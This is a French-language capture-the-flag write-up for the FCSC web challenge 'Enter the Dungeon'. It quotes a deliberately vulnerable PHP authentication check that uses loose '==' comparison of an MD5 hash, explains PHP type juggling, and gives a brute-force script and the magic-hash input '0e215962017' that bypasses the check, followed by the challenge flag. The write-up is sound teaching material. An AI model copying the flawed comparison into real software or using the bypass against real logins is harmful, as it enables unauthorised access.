# Enter the Dungeon - Web - 50

> On vous demande simplement de trouver le flag.

On a ici un challenge assez classique qui a obtenu le plus de validations dans la catégorie Web (580 à la fin du CTF).
En accédant à l'application, nous avons quelques indications supplémentaires:

> The flag is hidden into the dungeon ! You should come here as the dungeon_master to be able to open the gate and access the treasure.

> Les admins ont reçu un message indiquant qu'un pirate avait retrouvé le secret en contournant la sécurité du site.
Pour cette raison, le formulaire de vérification n'est plus fonctionnel tant que le développeur n'aura pas corrigé la vulnérabilité

Nous avons également un formulaire nous demandant d'entrer une clé secrète pour devenir le "dungeon master" (et ainsi récupérer le flag).

Nous pouvons en déduire deux choses:

* Nous devons trouver un moyen de s'authentifier pour obtenir le flag
* L'application semble comporter une vulnérabilité, permettant de contourner l'authentification.
* Le développeur est censé corriger cette vulnérabilité (il a peut être déjà appliqué son "patch")

Nous allons fouiller dans le code source pour voir s'il n'y a pas d'autres éléments intéressants:

```html
<!-- Pour les admins : si vous pouvez valider les changements que j'ai fait dans la page "check_secret.php", le code est accessible sur le fichier "check_secret.txt" -->
```

En effet, notre hypothèse se confirme, le développeur est bien en train de "corriger" la vulnérabilité et nous donne gracieusement le code de sa modification.

## Recherche de vulnérabilité


```php
<?php
	session_start();
	$_SESSION['dungeon_master'] = 0;
?>
<html>
<head>
	<title>Enter The Dungeon</title>
</head>
<body style="background-color:#3CB371;">
<center><h1>Enter The Dungeon</h1></center>
<?php
	echo '<div style="font-size:85%;color:purple">For security reason, secret check is disable !</div><br />';
	echo '<pre>'.chr(10);
	include('./ecsc.txt');
	echo chr(10).'</pre>';

	// authentication is replaced by an impossible test
	//if(md5($_GET['secret']) == "a5de2c87ba651432365a5efd928ee8f2")
	if(md5($_GET['secret']) == $_GET['secret'])
	{
		$_SESSION['dungeon_master'] = 1;
		echo "Secret is correct, welcome Master ! You can now enter the dungeon";
		
	}
	else
	{
		echo "Wrong secret !";
	}
?>
</body></html>
```

Le développeur semble avoir fixé la vulnérabilité par un test "impossible", il faut que le hash md5 du secret soit égal au secret qu'on lui fournit.

Nous repérons immédiatement l'utilisation de la comparaison simple "==", ce qui permet de faire du type juggling.

## Exploitation du type juggling

En php avec une comparaison simple, nous avons "0e123" == 0, la chaîne est interprétée en tant qu'entier et calculée.
Dans notre cas, 0^123 = 0 donc la comparaison est vraie.

Nous pouvons abuser de cette particularité pour bypasser la condition, il nous faut pour cela trouver une chaîne de la forme ```^0e[0-9]*$``` pour laquelle son hash md5 est aussi de cette même forme.

Pour cela, j'ai rapidement fait un script php qui fait ce travail:

```php
$i = 0;

do {
	$tohash = "0e".$i;
	$i++;
} while(md5($tohash) != $tohash);

echo $tohash . " = " . md5($tohash);
```

Le script va comparer toutes les chaînes de la forme "0eXXX" tant que le hash md5 n'est pas équivalent à cette chaîne.
Ce qui nous donne après quelques minutes:
```
0e215962017 = 0e291242476940776845150308577824
```

Nous pouvons donc rentrer cette chaîne "0e215962017", et nous obtenons le message suivant:

```Secret is correct, welcome Master ! You can now enter the dungeon ```

Nous retournons sur la page d'accueil et pouvons ainsi récupérer le flag !

```
Félicitation Maître, voici le flag : FCSC{f67aaeb3b15152b216cb1addbf0236c66f9d81c4487c4db813c1de8603bb2b5b}
```

FLAG: FCSC{f67aaeb3b15152b216cb1addbf0236c66f9d81c4487c4db813c1de8603bb2b5b}
